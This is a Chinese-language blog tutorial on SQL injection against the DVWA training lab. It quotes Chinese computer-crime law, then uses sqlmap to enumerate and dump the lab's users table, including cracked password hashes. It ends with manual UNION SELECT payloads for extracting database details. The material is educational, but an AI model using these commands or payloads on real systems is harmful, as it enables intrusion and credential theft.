---
title: SQL注入-sqlmap详解
author: Pandaho
date: 2022-01-25 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/sql-injection/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



```
Boolean-based blind SQL injection      基于布尔的盲注，即可以根据返回页面判断条件真假的注入；
Error-based queries SQL injection      基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；
Inline queries SQL injection           基于内联视图注入, 内联视图能够创建临时表，在处理某些查询情况时十分有用。
Stacked queries SQL injection      堆查询注入，可以同时执行多条语句的执行时的注入。
Time-based blind SQL injection     基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
UNION query SQL injection      联合查询注入，可以使用union的情况下的注入；
```




## 发现SQL注入漏洞后，如何收集数据库结构信息？

​	以DVWA为例，在找到注入点后，我用sqlmap进行数据收集

```sql
sqlmap -u "http://192.168.x.x/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=xxxxxx; security=low" --batch --dbs
--batch #不会询问你输入 全部默认确定
可以爆出目标数据库
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema

--batch -D dvwa --tables 
-D “” #指定数据库名
--tables  数据库表
知道数据库后，可以爆出表
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

--batch -D dvwa -T users  --columns
–columns #列出字段
-T “” #指定表名
知道表后，再爆字段
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+

--batch -D dvwa -T users  -C user,password --dump --stop 5
知道字段后爆内容，并且进行解密
-C “” #指定字段
–dump  #列出指定数据库的表的字段的数据
--stop xxx #输出指定字段数量
Database: dvwa                                                                                        Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+

--batch -D dvwa --count 
--count  #爆出用户条目
Database: dvwa
+-----------+---------+
| Table     | Entries |
+-----------+---------+
| users     | 5       |
| guestbook | 1       |
+-----------+---------+

```

或者通过SQL函数

```sql
1' union select 1,database() #
可以查询到当前数据库
1' union select 1,version() #
可以查询到版本信息
1' union select 1,system_user() #
可以查询到系统用户名
1' union select 1,user() #
可以查询到数据库用户名
1' union select 1,current_user() #
可以查询到当前用户名
1' union select 1,session_user() #
可以查询到连接数据库的用户名
1' union select 1,@@datadir #
可以查询到数据存储路径
1' union select 1,@@basedir #
可以查询到数据库安装路径
1' union select 1,@@version_compile_os #
可以查询到安装版本信息
```









## 参考来源

[MD5解密](https://www.cmd5.com/)  
[cookie](https://support.huaweicloud.com/vss_faq/vss_01_0146.html)  
[SQL详解](https://blog.csdn.net/weixin_44288604/article/details/120680334)  
